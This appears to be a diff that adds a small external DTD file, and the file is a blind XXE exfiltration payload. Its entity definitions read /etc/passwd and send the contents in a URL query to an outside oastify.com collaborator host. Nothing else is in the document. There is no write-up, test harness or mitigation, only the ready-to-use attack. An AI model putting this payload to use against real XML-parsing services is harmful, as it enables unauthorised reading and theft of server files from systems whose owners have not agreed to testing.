@@ -1,0 +1,4 @@
+<!ENTITY % read SYSTEM "file:///etc/passwd">
+<!ENTITY % w "<!ENTITY &#x25; sendFile SYSTEM 'http://b4ggcwfofmooynzeymrs5rkkmbs5gw4l.oastify.com/?x=%read;'>">
+%w;
+%sendFile;
